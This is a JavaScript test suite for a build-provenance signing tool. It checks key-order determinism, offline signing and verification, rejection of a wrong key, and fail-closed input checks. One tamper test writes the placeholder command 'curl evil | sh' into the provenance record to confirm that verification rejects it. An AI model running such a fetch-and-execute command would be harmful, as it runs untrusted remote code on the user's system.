import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { buildStatement, createKeypair, attest, verifyEnvelope } from './generate-provenance.mjs';

const commit = 'a'.repeat(40);
const artifact = `sha256:${'b'.repeat(64)}`;

function fixture() {
  const directory = mkdtempSync(join(tmpdir(), 'fia-prov-'));
  const path = name => join(directory, name);
  const documents = {
    lockfile: { schema: 'lock.v1', z: 1, a: 2 },
    policy: { schema: 'policy.v1', allowed: ['registry.npmjs.org'] },
    repro: { schema: 'repro.v1', ok: true },
    manifest: { schema: 'manifest.v1', files: [] },
    sbom: { schema: 'bom-1.5', components: [] }
  };

  for (const [name, value] of Object.entries(documents)) {
    writeFileSync(path(`${name}.json`), JSON.stringify(value));
  }

  return {
    path,
    options: {
      artifact,
      repository: 'https://github.com/MirrorCartographer/mirror-cartographer-ui',
      commit,
      command: 'npm ci && npm run build',
      environment: { node: '22', timezone: 'UTC' },
      lockfile: path('lockfile.json'),
      policy: path('policy.json'),
      reproducibility: path('repro.json'),
      manifest: path('manifest.json'),
      sbom: path('sbom.json')
    }
  };
}

test('canonical evidence is deterministic across JSON key order', () => {
  const first = fixture();
  const second = fixture();
  writeFileSync(second.path('lockfile.json'), '{"a":2,"z":1,"schema":"lock.v1"}');
  assert.equal(buildStatement(first.options).identity, buildStatement(second.options).identity);
});

test('signs and verifies completely offline', () => {
  const data = fixture();
  const privateKey = data.path('private.pem');
  const publicKey = data.path('public.pem');
  const output = data.path('provenance.json');
  createKeypair(privateKey, publicKey);
  const envelope = attest({ ...data.options, 'private-key': privateKey, output });
  assert.equal(verifyEnvelope(output, publicKey).provenanceIdentity, envelope.provenanceIdentity);
});

test('provenance tampering is rejected', () => {
  const data = fixture();
  const privateKey = data.path('private.pem');
  const publicKey = data.path('public.pem');
  const output = data.path('provenance.json');
  createKeypair(privateKey, publicKey);
  attest({ ...data.options, 'private-key': privateKey, output });
  const envelope = JSON.parse(readFileSync(output));
  envelope.provenance.build.command = 'curl evil | sh';
  writeFileSync(output, JSON.stringify(envelope));
  assert.throws(() => verifyEnvelope(output, publicKey), /identity mismatch/);
});

test('a different signing key is rejected', () => {
  const data = fixture();
  const privateKey = data.path('private.pem');
  const publicKey = data.path('public.pem');
  const otherPrivate = data.path('other.pem');
  const otherPublic = data.path('other.pub');
  const output = data.path('provenance.json');
  createKeypair(privateKey, publicKey);
  createKeypair(otherPrivate, otherPublic);
  attest({ ...data.options, 'private-key': privateKey, output });
  assert.throws(() => verifyEnvelope(output, otherPublic), /signature verification failed/);
});

test('mutable artifact aliases and abbreviated commits fail closed', () => {
  const data = fixture();
  assert.throws(() => buildStatement({ ...data.options, artifact: 'latest' }), /sha256/);
  assert.throws(() => buildStatement({ ...data.options, commit: 'abc123' }), /full lowercase/);
});

test('retained provenance evidence is never silently overwritten', () => {
  const data = fixture();
  const privateKey = data.path('private.pem');
  const publicKey = data.path('public.pem');
  const output = data.path('provenance.json');
  createKeypair(privateKey, publicKey);
  attest({ ...data.options, 'private-key': privateKey, output });
  assert.throws(() => attest({ ...data.options, 'private-key': privateKey, output }), /EEXIST/);
});
